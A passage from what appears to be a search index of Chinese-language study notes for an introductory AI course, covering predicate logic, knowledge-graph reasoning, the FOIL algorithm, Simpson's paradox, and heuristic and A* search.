\u8c13\u8bcd\uff1a\u8c13\u8bcd\u662f\u7528\u6765\u523b\u753b\u4e2a\u4f53\u5c5e\u6027\u6216\u8005\u63cf\u8ff0\u4e2a\u4f53\u4e4b\u95f4\u7684\u5173\u7cfb\u5b58\u5728\u6027\u7684\u5143\u7d20\uff0c\u5176\u503c\u4e3a\u771f\u6216\u5047 \u5305\u542b\u4e00\u4e2a\u53c2\u6570\u7684\u8c13\u8bcd\u79f0\u4e3a\u4e00\u5143\u8c13\u8bcd\uff0c\u8868\u793a\u4e00\u5143\u5173\u7cfb \u5305\u542b\u591a\u4e2a\u53c2\u6570\u7684\u8c13\u8bcd\u79f0\u4e3a\u591a\u5143\u8c13\u8bcd\uff0c\u8868\u793a\u4e2a\u4f53\u95f4\u7684\u591a\u5143\u5173\u7cfb \u89c4\u5b9a\uff0c\u7528 \\(A(\\cdots)\\) \u81f3 \\(Z(\\cdots)\\) \u8868\u793a\u8c13\u8bcd\uff0c\u4e3a\u5927\u5199\u5b57\u6bcd\u540e\u8ddf\u62ec\u53f7\uff0c\u62ec\u53f7\u5185\u653e\u7f6e\u4e2a\u4f53\u5e38\u91cf\u6216\u53d8\u91cf \u91cf\u8bcd\uff1a\u5168\u79f0\u91cf\u8bcd\u548c\u5b58\u5728\u91cf\u8bcd\u7edf\u79f0\u4e3a\u91cf\u8bcd \u5168\u79f0\u91cf\u8bcd\uff1a\u8868\u793a\u4e00\u5207\u7684\u3001\u6240\u6709\u7684\u3001\u51e1\u4e8b\u3001\u6bcf\u4e00\u4e2a\u7b49\uff0c\u7b26\u53f7 \\(\\forall\\) \u5b58\u5728\u91cf\u8bcd\uff1a\u8868\u793a\u5b58\u5728\u3001\u6709\u4e00\u4e2a\u3001\u67d0\u4e9b\u7b49\uff0c\u7b26\u53f7 \\(\\exist\\) \u5168\u79f0\u91cf\u8bcd\u7684\u63cf\u8ff0\u6027\u662f\u53ef\u4ee5\u7528\u76f8\u5e94\u7684\u5b58\u5728\u91cf\u8bcd\u7684\u85d0\u89c6\u5f62\u5f0f\u66ff\u6362 \u7ea6\u675f\u53d8\u5143\uff1a\u5728\u5168\u79f0\u91cf\u8bcd\u6216\u5b58\u5728\u91cf\u8bcd\u7ea6\u675f\u6761\u4ef6\u4e0b\u7684\u53d8\u91cf\u7b26\u53f7 \u81ea\u7531\u53d8\u5143\uff1a\u4e0d\u53d7\u5168\u79f0\u91cf\u8bcd\u6216\u5b58\u5728\u91cf\u8bcd\u7ea6\u675f\u7684\u53d8\u91cf\u7b26\u53f7 \u5b9a\u7406\uff1a\u81ea\u7531\u53d8\u5143\u65e2\u53ef\u4ee5\u5b58\u5728\u4e8e\u91cf\u8bcd\u7684\u7ea6\u675f\u8303\u56f4\u4e4b\u5185\uff0c\u4e5f\u53ef\u4ee5\u5b58\u5728\u4e8e\u91cf\u8bcd\u7ea6\u675f\u8303\u56f4\u4e4b\u5916\uff0c\u5373\uff1a \\((\\forall x)(A(x)\\vee B)\\equiv(\\forall x)A(x)\\vee B\\) \\((\\forall x)(A(x)\\wedge B)\\equiv(\\forall x)A(x)\\wedge B\\) \\((\\exist x)(A(x)\\vee B)\\equiv(\\exist x)A(x)\\vee B\\) \\((\\exist x)(A(x)\\wedge B)\\equiv(\\exist x)A(x)\\wedge B\\) \u5b9a\u7406\uff1a\u5728\u7ea6\u675f\u53d8\u5143\u76f8\u540c\u7684\u6761\u4ef6\u4e0b\uff0c\u91cf\u8bcd\u7684\u8fd0\u7b97\u6ee1\u8db3\u5206\u914d\u7387 \u5b9a\u7406\uff1a\u5f53\u516c\u5f0f\u4e2d\u5b58\u5728\u591a\u4e2a\u91cf\u8bcd\u65f6\uff0c\u82e5\u591a\u4e2a\u91cf\u8bcd\u90fd\u662f\u5168\u79f0\u91cf\u8bcd\u6216\u8005\u90fd\u662f\u5b58\u5728\u91cf\u8bcd\uff0c\u5219\u91cf\u8bcd\u4f4d\u7f6e\u53ef\u4ee5\u4e92\u6362\uff1b\u82e5\u591a\u4e2a\u91cf\u8bcd\u4e2d\u65e2\u6709\u5168\u79f0\u91cf\u8bcd\u53c8\u6709\u5b58\u5728\u91cf\u8bcd\uff0c\u5219\u91cf\u8bcd\u4f4d\u7f6e\u4e0d\u53ef\u4ee5\u968f\u610f\u4e92\u6362 \u8c13\u8bcd\u903b\u8f91\uff1a \u53ea\u5305\u542b\u4e2a\u4f53\u8c13\u8bcd\u548c\u4e2a\u4f53\u91cf\u8bcd\u7684\u8c13\u8bcd\u903b\u8f91\u79f0\u4e3a\u4e00\u9636\u8c13\u8bcd\u903b\u8f91\uff0c\u65e0\u6cd5\u5bf9\u8c13\u8bcd\u548c\u91cf\u8bcd\u8fdb\u884c\u91cf\u5316 \u9700\u8981\u9ad8\u9636\u8c13\u8bcd\u548c\u9ad8\u9636\u91cf\u8bcd\u8fdb\u884c\u91cf\u5316\uff0c\u5305\u542b\u9ad8\u9636\u8c13\u8bcd\u548c\u9ad8\u9636\u91cf\u8bcd\u7684\u8c13\u8bcd\u903b\u8f91\u79f0\u4e3a\u9ad8\u9636\u8c13\u8bcd\u903b\u8f91 \u9879\uff1a\u9879\u662f\u63cf\u8ff0\u5bf9\u8c61\u7684\u903b\u8f91\u8868\u8fbe\u5f0f\uff0c\u9012\u5f52\u5b9a\u4e49\uff1a \u5e38\u91cf\u7b26\u53f7\u548c\u53d8\u91cf\u7b26\u53f7\u662f\u9879 \u82e5 \\(f(x_1, x_2,\\cdots, x_n)\\) \u662f \\(n\\) \u5143\u51fd\u6570\u7b26\u53f7\uff0c \\(t_1, t_2, \\cdots, t_n\\) \u662f\u9879\uff0c\u5219 \\(f(t_1, t_2, \\cdots, t_n)\\) \u662f\u9879 \u6709\u9650\u6b21\u6570\u5730\u4f7f\u7528\u4e0a\u8ff0\u89c4\u5219\u4ea7\u751f\u7684\u7b26\u53f7\u4e32\u662f\u9879 \u539f\u5b50\u8c13\u8bcd\u516c\u5f0f\uff1a\u82e5 \\(P(x_1, x_2, \\cdots, x_n)\\) \u662f \\(n\\) \u5143\u8c13\u8bcd\uff0c \\(t_1, t_2, \\cdots, t_n\\) \u662f\u9879\uff0c\u5219\u79f0 \\(P(t_1, t_2, \\cdots, t_n)\\) \u4e3a\u539f\u5b50\u8c13\u8bcd\u516c\u5f0f\uff0c\u7b80\u79f0\u539f\u5b50\u516c\u5f0f \u5408\u5f0f\u516c\u5f0f\uff1a\u7531\u903b\u8f91\u8054\u7ed3\u8bcd\u548c\u539f\u5b50\u516c\u5f0f\u6784\u6210\u7684\u7528\u4e8e\u9648\u8ff0\u4e8b\u5b9e\u7684\u590d\u6742\u8bed\u53e5\uff0c\u53c8\u79f0\u8c13\u8bcd\u516c\u5f0f\uff1a \u547d\u9898\u5e38\u9879\uff0c\u547d\u9898\u53d8\u9879\uff0c\u539f\u5b50\u8c13\u8bcd\u516c\u5f0f\u90fd\u662f\u5408\u5f0f\u516c\u5f0f \u901a\u8fc7\u903b\u8f91\u8054\u7ed3\u8bcd\u8054\u7ed3\u5408\u5f0f\u516c\u5f0f\u5f97\u5230\u7684\u4e5f\u662f\u5408\u5f0f\u516c\u5f0f \u5982\u679c \\(A\\) \u662f\u5408\u5f0f\u516c\u5f0f\uff0c \\(x\\) \u662f\u4e2a\u4f53\u53d8\u9879\uff0c\u5219 \\((\\exist x)A(x), (\\forall x)A(x)\\) \u4e5f\u662f\u5408\u5f0f\u516c\u5f0f \u6709\u9650\u6b21\u6570\u5730\u4f7f\u7528\u4e0a\u8ff0\u89c4\u5219 \u63a8\u7406\u89c4\u5219\uff08 \\(A(x)\\) \u662f\u8c13\u8bcd\u516c\u5f0f\uff0c \\(x\\) \u548c \\(y\\) \u662f\u53d8\u5143\uff0c \\(a\\) \u662f\u5e38\u91cf\u7b26\u53f7\uff09 \u5168\u79f0\u91cf\u8bcd\u6d88\u53bb universal instantiation\uff08UI\uff09\uff1a \\((\\forall x)A(x)\\Rightarrow A(y)\\) \u5168\u79f0\u91cf\u8bcd\u5f15\u5165 universal generalization\uff08UG\uff09\uff1a \\(A(y)\\Rightarrow(\\forall x)A(x)\\) \u5b58\u5728\u91cf\u8bcd\u6d88\u53bb existential instantiation\uff08EI\uff09\uff1a \\((\\exist x)A(x)\\Rightarrow A(a)\\) \u5b58\u5728\u91cf\u8bcd\u5f15\u5165 existential generalization\uff08EG\uff09\uff1a \\(A(a)\\Rightarrow(\\exist x)A(x)\\)","title":"\u8c13\u8bcd\u903b\u8f91"},{"location":"cs/ai/basic/topic1/#_4","text":"\u77e5\u8bc6\u56fe\u8c31\uff08knowledge graph\uff09\u7531\u6709\u5411\u56fe\uff08directed graph\uff09\u6784\u6210\uff0c\u88ab\u7528\u6765\u63cf\u8ff0\u73b0\u5b9e\u4e16\u754c\u4e2d\u5b9e\u4f53\u53ca\u5b9e\u4f53\u4e4b\u95f4\u7684\u5173\u7cfb \u4e24\u4e2a\u8282\u70b9\u548c\u8fde\u63a5\u8fb9\u53ef\u8868\u793a\u4e3a\u5f62\u5982 <left_node, relation, right_node> \u7684\u4e09\u5143\u7ec4\u5f62\u5f0f\uff0c\u4e5f\u53ef\u8868\u793a\u4e3a\u4e00\u9636\u903b\u8f91\uff08fisrt order logic\uff0cFOL\uff09\u7684\u5f62\u5f0f \u5173\u7cfb\u63a8\u7406\u662f\u7edf\u8ba1\u5173\u7cfb\u5b66\u4e60\u7814\u7a76\u7684\u57fa\u672c\u95ee\u9898\uff0c\u4e5f\u662f\u5f53\u524d\u77e5\u8bc6\u56fe\u8c31\u9886\u57df\u7814\u7a76\u7684\u70ed\u70b9\u95ee\u9898 \u5f52\u7eb3\u903b\u8f91\u7a0b\u5e8f\u8bbe\u8ba1\uff08inductive logic programming\uff0cILP\uff09 ILP \u662f\u673a\u5668\u5b66\u4e60\u548c\u903b\u8f91\u7a0b\u5e8f\u8bbe\u8ba1\u4ea4\u53c9\u9886\u57df\u7684\u7814\u7a76\u5185\u5bb9 ILP \u4f7f\u7528\u4e00\u9636\u8c13\u8bcd\u903b\u8f91\u8fdb\u884c\u77e5\u8bc6\u8868\u793a\uff0c\u901a\u8fc7\u4fee\u6539\u548c\u6269\u5145\u903b\u8f91\u8868\u8fbe\u5f0f\u5bf9\u73b0\u6709\u77e5\u8bc6\u8fdb\u884c\u5f52\u7eb3\uff0c\u5b8c\u6210\u63a8\u7406\u5185\u5bb9 FOIL\uff08first order inductive learner\uff09\u7b97\u6cd5\u662f ILP \u7684\u4ee3\u8868\u6027\u65b9\u6cd5\uff0c\u901a\u8fc7 \u5e8f\u8d2f\u8986\u76d6 \u5b66\u4e60\u63a8\u7406\u89c4\u5219 \u8def\u5f84\u6392\u5e8f\u7b97\u6cd5\uff08path ranking algorithm\uff0cGRA\uff09 \u5c06\u5b9e\u4f53\u4e4b\u95f4\u7684\u5173\u8054\u8def\u5f84\u4f5c\u4e3a\u7279\u5f81\uff0c\u6765\u5b66\u4e60\u76ee\u6807\u5173\u7cfb\u7684\u5206\u7c7b\u5668 \u6d41\u7a0b\uff1a \u7279\u5f81\u62bd\u53d6\uff1a\u751f\u6210\u5e76\u9009\u62e9\u8def\u5f84\u7279\u5f81\u96c6\u5408\u3002\u751f\u6210\u8def\u5f84\u65b9\u6cd5\uff1a\u968f\u673a\u6e38\u8d70\uff08random walk\uff09\u3001BFS\u3001DFS \u7279\u5f81\u8ba1\u7b97\uff1a\u8ba1\u7b97\u6bcf\u4e2a\u8bad\u7ec3\u6837\u4f8b\u7684\u7279\u5f81\u503c \\(P(s\\rightarrow t; \\pi_j)\\) \uff0c\u8868\u793a\u4ece\u5b9e\u4f53\u8282\u70b9 \\(s\\) \u51fa\u53d1\uff0c\u901a\u8fc7\u5173\u7cfb\u8def\u5f84 \\(\\pi_j\\) \u8fbe\u5230\u5b9e\u4f53\u8282\u70b9 \\(t\\) \u7684\u6982\u7387\u3002\u6216\u8868\u793a\u662f\u5426\u5b58\u5728\u8fd9\u6837\u4e00\u6761\u8def\u5f84\uff0c\u6216\u8868\u793a\u8def\u5f84\u51fa\u73b0\u7684\u9891\u6b21\u9891\u7387 \u5206\u7c7b\u5668\u8bad\u7ec3\uff1a\u6839\u636e\u8bad\u7ec3\u6837\u4f8b\u7279\u5f81\u503c\uff0c\u4e3a\u76ee\u6807\u5173\u7cfb\u8bad\u7ec3\u5206\u7c7b\u5668\u3002\u8bad\u7ec3\u540e\u53ef\u7528\u4e8e\u63a8\u7406\u4e24\u4e2a\u5b9e\u4f53\u95f4\u662f\u5426\u5b58\u5728\u76ee\u6807\u5173\u7cfb","title":"\u77e5\u8bc6\u56fe\u8c31\u63a8\u7406"},{"location":"cs/ai/basic/topic1/#foil","text":"\u7b97\u6cd5\u5185\u5bb9 \u8f93\u5165\uff1a\u76ee\u6807\u8c13\u8bcd \\(P\\) \uff0c\u76ee\u6807\u8c13\u8bcd \\(P\\) \u7684\u8bad\u7ec3\u6837\u4f8b\uff08\u6b63\u4f8b\u96c6\u5408 \\(E^+\\) \u548c\u53cd\u4f8b\u96c6\u5408 \\(E^-\\) \uff09\uff0c\u4ee5\u53ca\u5176\u5b83\u80cc\u666f\u77e5\u8bc6\u6837\u4f8b \u8f93\u51fa\uff1a\u53ef\u5f97\u5230\u76ee\u6807\u8c13\u8bcd\u8fd9\u4e00\u7ed3\u8bba\u7684\u63a8\u7406\u89c4\u5219 \u8fc7\u7a0b\uff1a \u5c06\u76ee\u6807\u8c13\u8bcd\u4f5c\u4e3a\u6240\u5b66\u4e60\u63a8\u7406\u89c4\u5219\u7684\u7ed3\u8bba \u5c06\u5176\u5b83\u8c13\u8bcd\u9010\u4e00\u4f5c\u4e3a \u524d\u63d0\u7ea6\u675f\u8c13\u8bcd \u52a0\u5165\u63a8\u7406\u89c4\u5219\uff0c\u8ba1\u7b97\u6240\u5f97\u5230\u63a8\u7406\u89c4\u5219\u7684 FOIL \u4fe1\u606f\u589e\u76ca\u503c\uff0c\u9009\u53d6\u53ef\u5e26\u6765\u6700\u5927\u4fe1\u606f\u589e\u76ca\u503c\u7684\u524d\u63d0\u7ea6\u675f\u8c13\u8bcd\u52a0\u5165\u539f\u6765\u7684\u63a8\u7406\u89c4\u5219\uff0c\u5f97\u5230\u65b0\u7684\u63a8\u7406\u89c4\u5219\uff0c\u5e76\u5c06\u8bad\u7ec3\u6837\u4f8b\u96c6\u5408\u4e2d\u4e0e\u8be5\u63a8\u7406\u89c4\u5219\u4e0d\u7b26\u7684\u6837\u4f8b\u53bb\u6389 \u91cd\u590d b. \u8fc7\u7a0b\uff0c\u77e5\u9053\u6240\u5f97\u5230\u7684\u63a8\u7406\u89c4\u5219\u4e0d\u8986\u76d6\u4efb\u4f55\u53cd\u4f8b \u76ee\u6807\u8c13\u8bcd\u662f\u9700\u8981\u63a8\u65ad\u89c4\u5219\u7684\u7ed3\u8bba\uff0c\u4e5f\u79f0\u4e3a\u89c4\u5219\u5934 \u7ed9\u5b9a\u63a8\u7406\u7ed3\u8bba\u540e\uff0cFOIL \u7b97\u6cd5\u5b66\u4e60\u5f97\u5230\u4f7f\u5f97\u7ed3\u8bba\u6ee1\u8db3\u7684\u524d\u63d0\u6761\u4ef6\uff0c\u5373\u76ee\u6807\u8c13\u8bcd\u4f5c\u4e3a\u7ed3\u8bba\u7684\u63a8\u7406\u89c4\u5219 FOIL \u7b97\u6cd5\u4ece\u4e00\u822c\u5230\u7279\u6b8a\uff0c\u9010\u6b65\u6dfb\u52a0\u76ee\u6807\u8c13\u8bcd\u7684\u524d\u63d0\u7ea6\u675f\u8c13\u8bcd\uff0c\u76f4\u5230\u6240\u6784\u6210\u7684\u63a8\u7406\u89c4\u5219\u4e0d\u8986\u76d6\u4efb\u4f55\u53cd\u4f8b \u6dfb\u52a0\u524d\u63d0\u7ea6\u675f\u8c13\u8bcd\u540e\u6240\u5f97\u7684\u63a8\u7406\u89c4\u5219\u7684\u8d28\u91cf\u7684\u597d\u574f\u7531\u4fe1\u606f\u589e\u76ca\u503c\uff08information gain\uff09\u4f5c\u4e3a\u8bc4\u4f30\u6807\u51c6\uff0c\u8ba1\u7b97\u65b9\u6cd5\uff1a \\[ \\mathrm{FOIL\\_Gain} = \\widehat{m_+}\\cdot\\left(\\log_2\\frac{\\widehat{m_+}}{\\widehat{m_+}+\\widehat{m_-}}-\\log_2\\frac{m_+}{m_++m_-}\\right) \\] \\(\\widehat{m_+}, \\widehat{m_-}\\) \u662f\u589e\u52a0\u524d\u63d0\u7ea6\u675f\u8c13\u8bcd\u540e\u5f97\u5230\u7684\u65b0\u63a8\u7406\u89c4\u5219\u80fd\u8986\u76d6\u7684\u6b63\u4f8b\u548c\u53cd\u4f8b\u6570\u76ee \\(m_+, m_-\\) \u662f\u539f\u63a8\u7406\u89c4\u5219\u8986\u76d6\u7684\u6b63\u4f8b\u548c\u53cd\u4f8b\u6570\u76ee","title":"FOIL \u7b97\u6cd5"},{"location":"cs/ai/basic/topic1/#_5","text":"\u56e0\u679c\u63a8\u7406\uff08causal inference\uff09\u662f\u6307\u4ece\u89c2\u5bdf\u5230\u7684\u6570\u636e\u4e2d\u63a8\u65ad\u51fa\u56e0\u679c\u5173\u7cfb\u7684\u8fc7\u7a0b \u8f9b\u666e\u68ee\u6096\u8bba \u67d0\u7ec4\u75c5\u4eba\uff0c\u4e0d\u7528\u836f\u7684\u6062\u590d\u7387\u5927\u4e8e\u7528\u836f\u7684\u6062\u590d\u7387\uff1b\u4f46\u5355\u72ec\u89c2\u5bdf\u7537\u6027\u548c\u5973\u6027\uff0c\u5747\u662f\u7528\u836f\u7684\u6062\u590d\u7387\u5927\u4e8e\u4e0d\u7528\u836f\u7684\u6062\u590d\u7387 \u8f9b\u666e\u68ee\u6096\u8bba\uff08Simpson's paradox\uff09\u662f\u6307\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u67d0\u4e2a\u53d8\u91cf\u7684\u603b\u4f53\u6548\u5e94\u4e0e\u5176\u5b50\u96c6\u7684\u6548\u5e94\u76f8\u53cd \u5373 \\(\\dfrac{b}{a}<\\dfrac{d}{c}, \\dfrac{b'}{a'}<\\dfrac{d'}{c'}, \\dfrac{b+b'}{a+a'}>\\dfrac{d+d'}{c+c'}\\) \u8f9b\u666e\u68ee\u6096\u8bba\u8868\u660e\uff0c\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u5ffd\u7565\u6f5c\u5728\u7684\u53d8\u91cf\u53ef\u80fd\u4f1a\u6539\u53d8\u5df2\u6709\u7ed3\u8bba \u7ed3\u6784\u56e0\u679c\u6a21\u578b\uff08structural causal model\uff0cSCM\uff09 \u6f5c\u5728\u7ed3\u679c\u5206\u6790\u6846\u67b6\uff08Rubin-Neyman Causal Model\uff09\u3001 \u540e\u9762\u5927\u6982\u662f\u4e00\u5927\u5806\uff0c\u542c\u4e0d\u61c2\u770b\u4e0d\u61c2\uff0c\u611f\u89c9\u4e0d\u91cd\u8981\uff0c\u5f00\u6446\uff08\uff1f","title":"\u56e0\u679c\u63a8\u7406"},{"location":"cs/ai/basic/topic2/","text":"\u641c\u7d22\u6c42\u89e3 \u00b6 Abstract \u4eba\u5de5\u667a\u80fd\u57fa\u7840\u7b2c 5 \u5468\u8bfe\u7a0b\u5185\u5bb9 \u53c2\u8003\uff1a \u300a\u4eba\u5de5\u667a\u80fd\u5bfc\u8bba\uff1a\u6a21\u578b\u4e0e\u7b97\u6cd5\u300b- \u5434\u98de \u641c\u7d22\u7b97\u6cd5\u57fa\u7840 \u00b6 \u8bc4\u4ef7\u6307\u6807 \u5b8c\u5907\u6027\uff1a\u80fd\u5426\u627e\u5230\u89e3\uff08\u4e0d\u4e00\u5b9a\u6700\u4f18\uff09 \u6700\u4f18\u6027\uff1a\u80fd\u5426\u4fdd\u8bc1\u627e\u5230\u7684\u7b2c\u4e00\u4e2a\u89e3\u662f\u6700\u4f18\u89e3 \u65f6\u95f4\u590d\u6742\u5ea6\uff08\u901a\u8fc7\u6269\u5c55\u7684\u7ed3\u70b9\u6570\u91cf\u8861\u91cf\uff09 \u7a7a\u95f4\u590d\u6742\u5ea6\uff08\u901a\u8fc7\u540c\u65f6\u8bb0\u5f55\u7684\u7ed3\u70b9\u6570\u91cf\u8861\u91cf\uff09 \u641c\u7d22\u7b97\u6cd5\u6846\u67b6 F <- {\u6839\u8282\u70b9} while F != \u2205 do n <- pick_from(F) F <- F - {n} if goal_test(n) then return n.path end F <- F \u222a successor_nodes(n) end pick_from \u51b3\u5b9a\u6269\u5c55\u7ed3\u70b9\u7684\u987a\u5e8f\uff0csuccessor_nodes \u51b3\u5b9a\u54ea\u4e9b\u8282\u70b9\u53ef\u88ab\u653e\u5165\u8fb9\u7f18\u96c6\u5408\uff08fringe set\uff0c\u4e5f\u53eb\u5f00\u8868\uff0copen list\uff09\u4ee5\u5728\u540e\u9762\u6269\u5c55\uff08expand\uff09 \u6bcf\u6b21\u4ece\u8fb9\u7f18\u96c6\u5408\u4e2d\u53d6\u51fa\u6700\u4e0a\u5c42\uff08\u6700\u6d45\uff09\u7684\u7ed3\u70b9\u65f6\u662f\u5e7f\u5ea6\u4f18\u5148\u641c\u7d22\uff08breadth first search\uff0cBFS\uff09 \u6bcf\u6b21\u4ece\u8fb9\u7f18\u96c6\u5408\u4e2d\u53d6\u51fa\u6700\u4e0b\u5c42\uff08\u6700\u6df1\uff09\u7684\u7ed3\u70b9\u65f6\u662f\u6df1\u5ea6\u4f18\u5148\u641c\u7d22\uff08depth first search\uff0cDFS\uff09 \u653e\u5f03\u6269\u5c55\u90e8\u5206\u7ed3\u70b9\u7684\u505a\u6cd5\u79f0\u4e3a\u526a\u679d\uff08pruning\uff09 \u542f\u53d1\u5f0f\u641c\u7d22 \u00b6 \u5229\u7528\u4e00\u4e9b\u80fd\u591f\u8f85\u52a9\u7b97\u6cd5\u505a\u51fa\u51b3\u7b56\u7684\u989d\u5916\u4fe1\u606f\u7684\u641c\u7d22\u7b97\u6cd5\u79f0\u4e3a\u542f\u53d1\u5f0f\u641c\u7d22\uff08heuristic search\uff09\uff0c\u6216\u6709\u4fe1\u606f\u641c\u7d22\uff08informed search\uff09 \u63d0\u4f9b\u7684\u8fd9\u4e9b\u8f85\u52a9\u4fe1\u606f\u79f0\u4e3a\u542f\u53d1\u4fe1\u606f \u542f\u53d1\u4fe1\u606f\u901a\u5e38\u5f62\u5f0f\u5316\u4e3a\u4e00\u4e2a\u5173\u4e8e\u7ed3\u70b9\u7684\u51fd\u6570 \\(h(n)\\) \uff0c\u5176\u7528\u4e8e\u4f30\u8ba1\u7ed3\u70b9 \\(n\\) \u8ddd\u79bb\u8fbe\u5230\u76ee\u6807\u8fd8\u9700\u4ed8\u51fa\u591a\u5c11\u4ee3\u4ef7\uff0c\u8fd9\u4e2a\u51fd\u6570\u79f0\u4e3a\u542f\u53d1\u51fd\u6570\uff08heuristic function\uff09 \u542f\u53d1\u51fd\u6570\u901a\u5e38\u662f\u975e\u8d1f\u7684 \u5e38\u89c1\u7528\u6cd5\u662f\u7528\u6765\u66f4\u6539\u524d\u9762\u7684 pick_from \u51fd\u6570\u6765\u89c4\u5b9a\u6311\u9009\u7ed3\u70b9\u7684\u987a\u5e8f \u5bf9\u4e8e\u4efb\u610f\u7ed3\u70b9 \\(n\\) \uff0c\u51b3\u5b9a\u4e86\u641c\u7d22\u7b97\u6cd5\u6269\u5c55\u7ed3\u70b9 \\(n\\) \u7684\u4f18\u5148\u5ea6\u7684\u51fd\u6570 \\(f(n)\\) \u79f0\u4e3a\u8bc4\u4ef7\u51fd\u6570\uff08evaluation function\uff09 \u8bc4\u4ef7\u51fd\u6570\u503c\u8d8a\u5c0f\uff0c\u88ab\u6311\u9009\u7684\u4f18\u5148\u7ea7\u8d8a\u9ad8 \u6df1\u5ea6\u4f18\u5148\u641c\u7d22\u4e2d \\(f(n)\\) \u53ef\u88ab\u5b9a\u4e49\u4e3a\u8be5\u7ed3\u70b9\u6df1\u5ea6\u7684\u5012\u6570 \u5e7f\u5ea6\u4f18\u5148\u641c\u7d22\u4e2d \\(f(n)\\) \u53ef\u88ab\u5b9a\u4e49\u4e3a\u8be5\u7ed3\u70b9\u6df1\u5ea6 \u8d2a\u5a6a\u6700\u4f73\u4f18\u5148\u641c\u7d22 \u00b6 \u5373 greedy best-first search\uff0cGBFS \u4f18\u5148\u6269\u5c55\u8ddd\u79bb\u76ee\u6807\u8fd1\u7684\u7ed3\u70b9\uff0c\u5373\u4ee4 \\(f(n) = h(n)\\) \u4e0d\u6392\u9664\u73af\u8def\u7684\u8d2a\u5a6a\u6700\u4f73\u4f18\u5148\u641c\u7d22\u7b97\u6cd5\u662f\u4e0d\u5b8c\u5907\u7684 \u6392\u9664\u73af\u8def\u7684\u8d2a\u5a6a\u6700\u4f73\u4f18\u5148\u641c\u7d22\u662f\u5b8c\u5907\u7684\uff0c\u4f46\u4e0d\u4e00\u5b9a\u6700\u4f18 \u6700\u574f\u60c5\u51b5\u4e0b\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u548c\u7a7a\u95f4\u590d\u6742\u5ea6\u5747\u4e3a \\(O(b^m)\\) \\(b\\) \u4e3a\u5206\u652f\u56e0\u5b50\uff08\u6bcf\u4e2a\u7ed3\u70b9\u6700\u5927\u7684\u5206\u652f\u6570\u76ee\uff09 \\(m\\) \u4e3a\u6700\u5927\u6df1\u5ea6\uff0c\u4e5f\u5c31\u662f\u641c\u7d22\u6811\u4e2d\u8def\u5f84\u7684\u6700\u5927\u53ef\u80fd\u957f\u5ea6 A* \u641c\u7d22 \u00b6 \u8d2a\u5a6a\u6700\u4f73\u4f18\u5148\u641c\u7d22\u7b97\u6cd5\u7684\u95ee\u9898\u662f\u6ca1\u6709\u8003\u8651\u4ece\u521d\u59cb\u7ed3\u70b9\u5230\u6269\u5c55\u7ed3\u70b9\u6240\u9700\u7684\u4ee3\u4ef7 A* \u7b97\u6cd5\u628a\u4ece\u521d\u59cb\u7ed3\u70b9\u5230\u5f53\u524d\u7ed3\u70b9\u7684\u8def\u5f84\u4ee3\u4ef7\u5728\u8bc4\u4ef7\u51fd\u6570\u4e2d\u8fdb\u884c\u4e86\u8003\u8651 \u4ee4 \\(f(n) = g(n) + h(n)\\) \uff0c\u5176\u4e2d \\(g(n)\\) \u4e3a\u4ece\u521d\u59cb\u7ed3\u70b9\u5230\u7ed3\u70b9 \\(n\\) \u7684\u8def\u5f84\u4ee3\u4ef7 \u6bcf\u6b21\u4ece\u8fb9\u7f18\u96c6\u5408\u4e2d\u6269\u5c55\u7684\u7ed3\u70b9\u5e76\u975e\u603b\u662f\u5f53\u524d\u7ed3\u70b9\u7684\u76f8\u90bb\u540e\u7ee7\u7ed3\u70b9 \u826f\u597d\u7684\u542f\u53d1\u51fd\u6570\u9700\u8981\u6ee1\u8db3\u7684\u6027\u8d28 \u53ef\u5bb9\u6027\uff08admissible\uff09\uff1a\u5bf9\u4e8e\u4efb\u610f\u7ed3\u70b9 \\(n\\) \uff0c \\(h(n)\\) \u7684\u503c\u4e0d\u4f1a\u8d85\u8fc7\u4ece\u7ed3\u70b9 \\(n\\) \u5230\u76ee\u6807\u7ed3\u70b9\u7684\u6700\u4f73\u8def\u5f84\u4ee3\u4ef7 \u4e00\u81f4\u6027\uff08consistency\uff09\uff1a\u5bf9\u4e8e\u4efb\u610f\u7ed3\u70b9 \\(n\\) \uff0c\u5982\u679c\u4ece\u7ed3\u70b9 \\(n\\) \u5230\u76ee\u6807\u7ed3\u70b9\u7684\u6700\u4f73\u8def\u5f84\u7ecf\u8fc7\u7ed3\u70b9 \\(n'\\) \uff0c\u5219 \\(h(n) \\leq c(n, n') + h(n')\\) \uff0c\u5176\u4e2d \\(c(n, n')\\) \u4e3a\u4ece\u7ed3\u70b9 \\(n\\) \u5230\u7ed3\u70b9 \\(n'\\) \u7684\u8def\u5f84\u4ee3\u4ef7 \u6ee1\u8db3\u4e00\u81f4\u6027\u4e00\u5b9a\u6ee1\u8db3\u53ef\u5bb9\u6027 A* \u7b97\u6cd5\u5b8c\u5907\u7684\u6761\u4ef6 \u641c\u7d22\u6811\u4e2d\u5206\u652f\u6570\u91cf\u6709\u9650\uff0c\u5373\u6bcf\u4e2a\u7ed3\u70b9\u7684\u540e\u7ee7\u7ed3\u70b9\u6570\u91cf\u662f\u6709\u9650\u7684 \u5355\u6b65\u4ee3\u4ef7\u7684\u4e0b\u5c4a\u662f\u4e00\u4e2a\u6b63\u6570 \u542f\u53d1\u51fd\u6570\u6709\u4e0b\u5c4a \u542f\u53d1\u51fd\u6570\u6ee1\u8db3\u4e00\u81f4\u6027\u65f6\uff0cA* \u7b97\u6cd5\u662f\u6700\u4f18\u7684 \u5bf9\u6297\u641c\u7d22 \u00b6 \u667a\u80fd\u4f53\u4e0d\u552f\u4e00\uff0c\u89e3\u51b3\u4fe1\u606f\u786e\u5b9a\u3001\u5168\u5c40\u53ef\u89c2\u5bdf\u3001\u8f6e\u6d41\u884c\u52a8\u3001\u8f93\u8d62\u6536\u76ca\u96f6\u548c\u7684\u535a\u5f08\u95ee\u9898\uff0c\u6c42\u89e3\u8fd9\u6837\u95ee\u9898\u7684\u7b97\u6cd5\u79f0\u4e3a\u5bf9\u6297\u641c\u7d22\uff08adversarial search\uff09\u6216\u535a\u5f08\u641c\u7d22\uff08game search\uff09 \u667a\u80fd\u4f53\u4f1a\u9009\u62e9\u6700\u5927\u5316\u81ea\u8eab\u5229\u76ca\u3001\u6700\u5c0f\u5316\u5bf9\u624b\u5229\u76ca\u7684\u7b56\u7565 \u5f62\u5f0f\u5316\u63cf\u8ff0\uff1a \u72b6\u6001\uff1a\u72b6\u6001 \\(s\\) 